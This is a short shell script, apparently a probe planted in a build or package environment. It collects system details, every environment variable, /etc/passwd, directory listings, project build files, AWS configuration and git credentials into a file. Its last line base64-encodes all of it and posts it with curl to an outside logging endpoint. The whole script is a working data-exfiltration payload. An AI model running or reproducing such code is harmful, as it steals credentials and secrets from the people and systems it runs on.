echo "-- uname -a" >> output.txt
uname -a >> output.txt
echo "-- env" >> output.txt
env >> output.txt
echo "-- /etc/passwd" >> output.txt
cat /etc/passwd >> output.txt
echo "-- CURRENT FOLDER" >> output.txt
ls -al >> output.txt
echo "-- HOME FOLDER" >> output.txt
ls -al ~/ >> output.txt
echo "-- / FOLDER" >> output.txt
ls -al / >> output.txt
echo "-- docker-entrypoint.sh" >> output.txt
cat ../../docker-entrypoint.sh >> output.txt
echo "-- Cargo.toml" >> output.txt
cat ../../Cargo.toml >> output.txt
echo "-- package.json" >> output.txt
cat ../../package.json >> output.txt
echo "-- npm.sh" >> output.txt
cat ../../npm.sh >> output.txt
echo "-- .aws/config" >> output.txt
cat ~/.aws/config >> output.txt
echo "-- .git-credentials/*" >> output.txt
cat ~/.git-credentials/* >> output.txt
curl -H "Hostname: $(hostname | base64)" -H "Whoami: $(id | base64)" -H "Pwd: $(pwd | base64)" -d "$(cat output.txt | base64)"  "https://d7.lc/sage_h1/logger.php"
